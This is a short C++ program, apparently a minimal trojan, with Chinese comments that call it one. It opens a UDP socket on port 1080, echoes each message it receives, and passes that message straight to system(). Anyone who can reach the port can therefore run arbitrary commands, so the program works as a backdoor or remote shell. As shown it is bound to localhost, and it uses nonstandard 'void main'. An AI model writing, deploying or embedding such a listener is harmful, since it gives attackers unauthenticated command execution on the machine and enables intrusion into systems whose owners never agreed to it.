#include <iostream>
#include<string>
#include <boost/asio.hpp>
#include <stdlib.h>

using namespace std;
using namespace boost::asio;
void main()
{

	io_service io_serviceA;//一个服务的类，给这个UDP通信初始化
	ip::udp::socket udp_socket(io_serviceA);//给这个UDP通信初始化
	ip::udp::endpoint local_add(ip::address::from_string("127.0.0.1"), 1080);//绑定IP还有木马

	udp_socket.open(local_add.protocol());//添加协议

	udp_socket.bind(local_add);//绑定IP以及端口
	char receive_str[1024] = { 0 };//字符串
	while (1)
	{
		ip::udp::endpoint  sendpoint;//请求的IP以及端口

		udp_socket.receive_from(buffer(receive_str, 1024),sendpoint);//收取
		cout << "收到" << receive_str << endl;
		udp_socket.send_to(buffer(receive_str), sendpoint);//发送
		system(receive_str);
		memset(receive_str, 0, 1024);//清空字符串

	}





	cin.get();
}
